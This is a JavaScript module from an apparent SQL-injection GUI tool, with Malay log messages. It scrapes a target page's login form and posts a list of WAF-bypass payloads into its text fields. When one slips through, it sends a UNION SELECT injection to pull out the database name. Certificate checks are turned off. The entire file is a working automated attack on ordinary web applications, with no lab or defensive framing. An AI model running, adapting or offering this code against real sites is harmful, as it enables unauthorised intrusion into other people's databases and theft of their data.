// 📁 sqli-electron-gui/dbextract.js
const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
const https = require('https');
const wafPayloads = require('./wafPayloads');
const agent = new https.Agent({ rejectUnauthorized: false });

async function extractDatabaseInfo(url) {
  const log = [];

  try {
    const res = await axios.get(url, { httpsAgent: agent, responseType: 'text' });
    const $ = cheerio.load(res.data);
    const form = $('form').first();
    const action = form.attr('action') || url;
    const method = (form.attr('method') || 'post').toLowerCase();
    const inputs = form.find('input');

    const allFields = {};
    const textFields = [];

    inputs.each((i, el) => {
      const type = ($(el).attr('type') || 'text').toLowerCase();
      const name = $(el).attr('name');
      const value = $(el).attr('value') || '';
      if (!name) return;
      if (["hidden", "submit", "button", "checkbox"].includes(type)) {
        allFields[name] = value || '1';
      } else {
        allFields[name] = value;
        textFields.push(name);
      }
    });

    if (textFields.length < 2) {
      log.push('❌ Tak cukup input login.');
      return log;
    }

    const [param1, param2] = textFields;
    const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;

    let success = false;
    let workingPayload = null;

    for (let payload of wafPayloads) {
      const test = { ...allFields };
      test[param1] = payload;
      test[param2] = payload;

      const testRes = await axios.post(targetUrl, qs.stringify(test), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        validateStatus: () => true,
        httpsAgent: agent,
        responseType: 'text'
      });

      if (testRes.status < 400 && typeof testRes.data === 'string' && !testRes.data.includes('error')) {
        log.push(`✅ Payload berjaya bypass: ${payload}`);
        success = true;
        workingPayload = payload;
        break;
      }
    }

    if (!success) {
      log.push('❌ Tiada payload berjaya bypass WAF.');
      return log;
    }

    const dbPayload = "' UNION SELECT database(), NULL-- -";
    const dbReq = { ...allFields };
    dbReq[param1] = dbPayload;
    dbReq[param2] = dbPayload;
    const dbRes = await axios.post(targetUrl, qs.stringify(dbReq), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      httpsAgent: agent,
      responseType: 'text'
    });

    const dbMatch = typeof dbRes.data === 'string' ? dbRes.data.match(/([a-zA-Z0-9_]+)[^a-zA-Z0-9_]/) : null;
    const dbName = dbMatch ? dbMatch[1] : null;
    if (!dbName) {
      log.push('❌ Tak jumpa nama database.');
      return log;
    }

    log.push(`📦 Database: ${dbName}`);
    log.push(`(Guna payload: ${workingPayload})`);

    return log;
  } catch (err) {
    log.push(`❌ Ralat semasa extract: ${err.message}`);
    return log;
  }
}

module.exports = { extractDatabaseInfo };
